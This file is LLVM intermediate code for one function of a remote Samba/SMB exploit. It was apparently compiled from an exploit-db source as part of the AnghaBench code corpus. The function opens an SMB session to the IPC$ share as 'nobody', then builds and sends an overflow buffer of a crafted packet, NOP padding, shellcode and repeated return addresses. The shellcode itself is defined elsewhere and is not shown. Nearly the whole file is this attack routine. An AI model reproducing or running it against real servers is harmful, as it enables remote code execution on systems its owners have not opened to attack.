; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22468.c___atk_code_send_recv.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22468.c___atk_code_send_recv.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.__atk_code_send_recv.its_exploit_packet = private unnamed_addr constant [97 x i8] c"\00\04\09`\FFSMB2\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00d\00\00\00\00\D0\07\0C\00\D0\07\0C\00\00\00\00\00\00\00\00\00\00\00\D0\07C\00\0C\00\14\08\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\90\00", align 16
@__const.__atk_code_send_recv.its_first_time_conn = private unnamed_addr constant [50 x i8] c"\00\00\00.\FFSMBs\00\00\00\00\08\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00d\00\01\00\00\FF\00\00\00\00 \02\00\01\00\00\00\00", align 16
@__const.__atk_code_send_recv.its_second_time_conn = private unnamed_addr constant [64 x i8] c"\00\00\00<\FFSMBp\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0C d\00\00\00\00\00\00\00\\\\ipc$%nobody\00\00\00\00\00\00\00IPC$", align 16
@DF_NOP = common dso_local global i32 0, align 4
@__BUF_LEN = common dso_local global i32 0, align 4
@__LEN_PAD = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @__atk_code_send_recv(i32 %0, i32 %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [2405 x i8], align 16
  %9 = alloca [97 x i8], align 16
  %10 = alloca [50 x i8], align 16
  %11 = alloca [64 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %4, align 4
  store i32 %1, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %14 = bitcast [97 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %14, i8* align 16 getelementptr inbounds ([97 x i8], [97 x i8]* @__const.__atk_code_send_recv.its_exploit_packet, i32 0, i32 0), i64 97, i1 false)
  %15 = bitcast [50 x i8]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %15, i8* align 16 getelementptr inbounds ([50 x i8], [50 x i8]* @__const.__atk_code_send_recv.its_first_time_conn, i32 0, i32 0), i64 50, i1 false)
  %16 = bitcast [64 x i8]* %11 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %16, i8* align 16 getelementptr inbounds ([64 x i8], [64 x i8]* @__const.__atk_code_send_recv.its_second_time_conn, i32 0, i32 0), i64 64, i1 false)
  store i32 50, i32* %12, align 4
  store i32 64, i32* %13, align 4
  %17 = getelementptr inbounds [2405 x i8], [2405 x i8]* %8, i64 0, i64 0
  %18 = call i32 @memset(i8* %17, i32 0, i32 2405)
  %19 = getelementptr inbounds [2405 x i8], [2405 x i8]* %8, i64 0, i64 0
  %20 = getelementptr inbounds [50 x i8], [50 x i8]* %10, i64 0, i64 0
  %21 = call i32 @memcpy(i8* %19, i8* %20, i32 50)
  %22 = load i32, i32* %4, align 4
  %23 = getelementptr inbounds [2405 x i8], [2405 x i8]* %8, i64 0, i64 0
  %24 = load i32, i32* %12, align 4
  %25 = call i32 @send(i32 %22, i8* %23, i32 %24, i32 0)
  %26 = load i32, i32* %4, align 4
  %27 = getelementptr inbounds [2405 x i8], [2405 x i8]* %8, i64 0, i64 0
  %28 = call i32 @recv(i32 %26, i8* %27, i32 2404, i32 0)
  %29 = getelementptr inbounds [2405 x i8], [2405 x i8]* %8, i64 0, i64 0
  %30 = call i32 @memset(i8* %29, i32 0, i32 2405)
  %31 = getelementptr inbounds [2405 x i8], [2405 x i8]* %8, i64 0, i64 0
  %32 = getelementptr inbounds [64 x i8], [64 x i8]* %11, i64 0, i64 0
  %33 = call i32 @memcpy(i8* %31, i8* %32, i32 64)
  %34 = load i32, i32* %4, align 4
  %35 = getelementptr inbounds [2405 x i8], [2405 x i8]* %8, i64 0, i64 0
  %36 = load i32, i32* %13, align 4
  %37 = call i32 @send(i32 %34, i8* %35, i32 %36, i32 0)
  %38 = load i32, i32* %4, align 4
  %39 = getelementptr inbounds [2405 x i8], [2405 x i8]* %8, i64 0, i64 0
  %40 = call i32 @recv(i32 %38, i8* %39, i32 2404, i32 0)
  %41 = getelementptr inbounds [2405 x i8], [2405 x i8]* %8, i64 0, i64 0
  %42 = call i32 @memset(i8* %41, i32 0, i32 2405)
  %43 = getelementptr inbounds [2405 x i8], [2405 x i8]* %8, i64 0, i64 0
  %44 = load i32, i32* %7, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds i8, i8* %43, i64 %45
  %47 = getelementptr inbounds [97 x i8], [97 x i8]* %9, i64 0, i64 0
  %48 = call i32 @memcpy(i8* %46, i8* %47, i32 97)
  %49 = load i32, i32* %7, align 4
  %50 = sext i32 %49 to i64
  %51 = add i64 %50, 97
  %52 = trunc i64 %51 to i32
  store i32 %52, i32* %7, align 4
  %53 = getelementptr inbounds [2405 x i8], [2405 x i8]* %8, i64 0, i64 0
  %54 = load i32, i32* %7, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i8, i8* %53, i64 %55
  %57 = load i32, i32* @DF_NOP, align 4
  %58 = load i32, i32* @__BUF_LEN, align 4
  %59 = load i32, i32* @__LEN_PAD, align 4
  %60 = sub nsw i32 %58, %59
  %61 = load i8*, i8** @shellcode, align 8
  %62 = call i32 @strlen(i8* %61)
  %63 = sub nsw i32 %60, %62
  %64 = load i32, i32* %7, align 4
  %65 = sub nsw i32 %63, %64
  %66 = call i32 @memset(i8* %56, i32 %57, i32 %65)
  %67 = load i32, i32* @__BUF_LEN, align 4
  %68 = load i32, i32* @__LEN_PAD, align 4
  %69 = sub nsw i32 %67, %68
  %70 = load i8*, i8** @shellcode, align 8
  %71 = call i32 @strlen(i8* %70)
  %72 = sub nsw i32 %69, %71
  %73 = load i32, i32* %7, align 4
  %74 = sub nsw i32 %72, %73
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  %77 = getelementptr inbounds [2405 x i8], [2405 x i8]* %8, i64 0, i64 0
  %78 = load i32, i32* %7, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %77, i64 %79
  %81 = load i8*, i8** @shellcode, align 8
  %82 = load i8*, i8** @shellcode, align 8
  %83 = call i32 @strlen(i8* %82)
  %84 = call i32 @memcpy(i8* %80, i8* %81, i32 %83)
  %85 = load i8*, i8** @shellcode, align 8
  %86 = call i32 @strlen(i8* %85)
  %87 = load i32, i32* %7, align 4
  %88 = add nsw i32 %87, %86
  store i32 %88, i32* %7, align 4
  %89 = getelementptr inbounds [2405 x i8], [2405 x i8]* %8, i64 0, i64 0
  %90 = load i32, i32* %7, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i8, i8* %89, i64 %91
  %93 = load i32, i32* @DF_NOP, align 4
  %94 = load i32, i32* @__LEN_PAD, align 4
  %95 = call i32 @memset(i8* %92, i32 %93, i32 %94)
  %96 = load i32, i32* @__LEN_PAD, align 4
  %97 = load i32, i32* %7, align 4
  %98 = add nsw i32 %97, %96
  store i32 %98, i32* %7, align 4
  %99 = load i32, i32* %5, align 4
  %100 = sub nsw i32 %99, 260
  %101 = sext i32 %100 to i64
  %102 = load i32, i32* %7, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds [2405 x i8], [2405 x i8]* %8, i64 0, i64 %103
  %105 = bitcast i8* %104 to i64*
  store i64 %101, i64* %105, align 1
  %106 = load i32, i32* %7, align 4
  %107 = add nsw i32 %106, 4
  store i32 %107, i32* %7, align 4
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = load i32, i32* %7, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds [2405 x i8], [2405 x i8]* %8, i64 0, i64 %111
  %113 = bitcast i8* %112 to i64*
  store i64 %109, i64* %113, align 1
  %114 = load i32, i32* %7, align 4
  %115 = add nsw i32 %114, 4
  store i32 %115, i32* %7, align 4
  %116 = load i32, i32* %5, align 4
  %117 = sub nsw i32 %116, 260
  %118 = sext i32 %117 to i64
  %119 = load i32, i32* %7, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds [2405 x i8], [2405 x i8]* %8, i64 0, i64 %120
  %122 = bitcast i8* %121 to i64*
  store i64 %118, i64* %122, align 1
  %123 = load i32, i32* %7, align 4
  %124 = add nsw i32 %123, 4
  store i32 %124, i32* %7, align 4
  %125 = load i32, i32* %4, align 4
  %126 = getelementptr inbounds [2405 x i8], [2405 x i8]* %8, i64 0, i64 0
  %127 = call i32 @send(i32 %125, i8* %126, i32 2404, i32 0)
  %128 = load i32, i32* %3, align 4
  ret i32 %128
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
